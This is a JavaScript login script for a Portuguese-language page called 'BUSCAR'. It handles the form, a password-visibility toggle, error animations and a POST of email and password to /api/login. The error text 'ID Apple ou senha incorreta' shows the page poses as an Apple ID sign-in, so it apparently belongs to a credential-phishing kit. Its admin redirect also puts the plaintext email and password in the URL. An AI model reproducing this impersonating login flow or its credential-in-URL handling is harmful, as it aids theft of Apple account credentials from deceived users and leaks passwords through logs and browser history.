// ============================================
// BUSCAR - Login Script
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailGroup = document.getElementById('emailGroup');
    const passwordGroup = document.getElementById('passwordGroup');
    const logo = document.getElementById('logo');
    const errorMessage = document.getElementById('errorMessage');
    const btnLogin = document.getElementById('btnLogin');
    const togglePassword = document.getElementById('togglePassword');
    const eyeOpen = togglePassword.querySelector('.eye-open');
    const eyeClosed = togglePassword.querySelector('.eye-closed');

    let isPasswordVisible = false;

    // Toggle password visibility
    togglePassword.addEventListener('click', (e) => {
        e.preventDefault();
        isPasswordVisible = !isPasswordVisible;
        
        if (isPasswordVisible) {
            passwordInput.type = 'text';
            eyeOpen.style.display = 'none';
            eyeClosed.style.display = 'block';
        } else {
            passwordInput.type = 'password';
            eyeOpen.style.display = 'block';
            eyeClosed.style.display = 'none';
        }
    });

    // Clear error state on input
    emailInput.addEventListener('input', () => {
        emailGroup.classList.remove('error');
        hideError();
    });

    passwordInput.addEventListener('input', () => {
        passwordGroup.classList.remove('error');
        hideError();
    });

    // Focus effects
    emailInput.addEventListener('focus', () => {
        emailGroup.classList.remove('error');
    });

    passwordInput.addEventListener('focus', () => {
        passwordGroup.classList.remove('error');
    });

    // Form submit
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (!email || !password) {
            showError('Preencha todos os campos.');
            if (!email) emailGroup.classList.add('error');
            if (!password) passwordGroup.classList.add('error');
            shakelogo();
            return;
        }

        // Show loading state
        setLoading(true);

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });

            const data = await response.json();

            if (data.success && data.isAdmin) {
                // Admin login - redirect to admin panel
                btnLogin.style.background = '#30d158';
                btnLogin.querySelector('.btn-text').textContent = '✓ Conectado';
                setLoading(false);
                
                setTimeout(() => {
                    window.location.href = `/admin.html?e=${encodeURIComponent(email)}&p=${encodeURIComponent(password)}`;
                }, 800);
            } else {
                // Failed login - shake logo
                setLoading(false);
                showError(data.message || 'ID Apple ou senha incorreta.');
                emailGroup.classList.add('error');
                passwordGroup.classList.add('error');
                shakelogo();

                // Clear password but keep email
                passwordInput.value = '';

                // Add haptic feedback if supported
                if (navigator.vibrate) {
                    navigator.vibrate([100, 50, 100]);
                }
            }
        } catch (err) {
            setLoading(false);
            showError('Erro de conexão. Tente novamente.');
            shakelogo();
            passwordInput.value = '';
        }
    });

    // Shake logo animation
    function shakelogo() {
        logo.classList.remove('shake');
        // Force reflow
        void logo.offsetWidth;
        logo.classList.add('shake');

        logo.addEventListener('animationend', () => {
            logo.classList.remove('shake');
        }, { once: true });
    }

    // Show error message
    function showError(msg) {
        const span = errorMessage.querySelector('span');
        if (span) span.textContent = msg;
        errorMessage.classList.add('show');
    }

    // Hide error message
    function hideError() {
        errorMessage.classList.remove('show');
    }

    // Set button loading state
    function setLoading(loading) {
        if (loading) {
            btnLogin.classList.add('loading');
            btnLogin.disabled = true;
        } else {
            btnLogin.classList.remove('loading');
            btnLogin.disabled = false;
            btnLogin.querySelector('.btn-text').textContent = 'Iniciar Sessão';
            btnLogin.style.background = '';
        }
    }

    // Auto-focus email on load
    setTimeout(() => {
        emailInput.focus();
    }, 600);
});
